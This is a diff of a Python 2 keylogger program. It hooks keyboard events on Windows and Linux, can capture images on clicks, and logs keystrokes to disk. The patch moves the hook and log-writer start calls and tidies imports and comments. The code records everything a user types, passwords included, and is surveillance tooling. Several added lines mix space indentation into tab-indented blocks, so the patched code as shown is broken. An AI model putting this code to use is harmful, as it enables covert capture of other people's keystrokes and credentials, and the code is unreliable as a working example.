@@ -20,15 +20,18 @@
 ##
 ##############################################################################
 
-import os, time, sys
+import os
+import time
+import sys
 if os.name == 'posix':
 	import pyxhook
 elif os.name == 'nt':
 	import pyHook
+    import pythoncom
 else:
 	print "OS is not recognised as windows or linux."
 	exit()
-#import pythoncom
+
 import imp # don't need this anymore?
 from optparse import OptionParser
 import traceback
@@ -56,7 +59,6 @@ class KeyLogger:
 		self.q = Queue.Queue(0)
 		self.lw = LogWriter(self.settings, self.cmdoptions, self.q) 
 		self.panel = False
-		self.lw.start()
 		if os.name == 'nt':
 			self.hm = pyHook.HookManager()
 			self.hm.KeyDown = self.OnKeyDownEvent
@@ -64,21 +66,28 @@ class KeyLogger:
 			if self.settings['General']['Hook Keyboard'] == True:
 				self.hm.HookKeyboard()
 		elif os.name == 'posix':
-			time.sleep(1) #Logwriter isn't creating the "logs" directory immediately, so I have to wait for that.
-			if self.settings['Image Capture']['Capture Clicks'] == "True":
-				captureclickimages = True
-			self.hm = pyxhook.pyxhook(captureclicks = captureclickimages, clickimagedimensions = {"width":int(self.settings['Image Capture']['Capture Clicks Width']), "height":int(self.settings['Image Capture']['Capture Clicks Height'])}, logdir = self.settings['General']['Log Directory'], KeyDown = self.OnKeyDownEvent, KeyUp = self.OnKeyUpEvent)
-			self.hm.start()
+			#time.sleep(1) #Logwriter isn't creating the "logs" directory immediately, so I have to wait for that.
+			#if self.settings['Image Capture']['Capture Clicks'] == "True":
+				#captureclickimages = True
+			self.hm = pyxhook.pyxhook(captureclicks = self.settings['Image Capture']['Capture Clicks'], clickimagedimensions = {"width":self.settings['Image Capture']['Capture Clicks Width'], "height":self.settings['Image Capture']['Capture Clicks Height']}, logdir = self.settings['General']['Log Directory'], KeyDown = self.OnKeyDownEvent, KeyUp = self.OnKeyUpEvent)
+			#self.hm.start()
 		#if self.options.hookMouse == True:
 		#   self.hm.HookMouse()
 
 	def start(self):
+        self.lw.start()
 		if os.name == 'nt':
 			pythoncom.PumpMessages()
+        if os.name == 'posix':
+            self.hm.start()
 	
 	def ParseControlKey(self):
 		self.controlKeyList = self.settings['General']['Control Key'].split(';')
-		if os.name == 'nt':
+		
+        # under windows, all keynames start with a capital letter and continue with all lowercase
+        # so we force the key list to this format, to be more tolerant of variant user inputs
+        # under linux, keyname capitalization is not so consistent... so we take what we get.
+        if os.name == 'nt':
 			self.controlKeyList = [item.capitalize() for item in self.controlKeyList]
 		self.controlKeyHash = dict(zip(self.controlKeyList, [False for item in self.controlKeyList]))
 		
@@ -209,6 +218,7 @@ if __name__ == '__main__':
 	kl = KeyLogger()
 	kl.start()
 	
+    # what is this for, i wonder...?
 	while True:
 		time.sleep(240)
 		pass
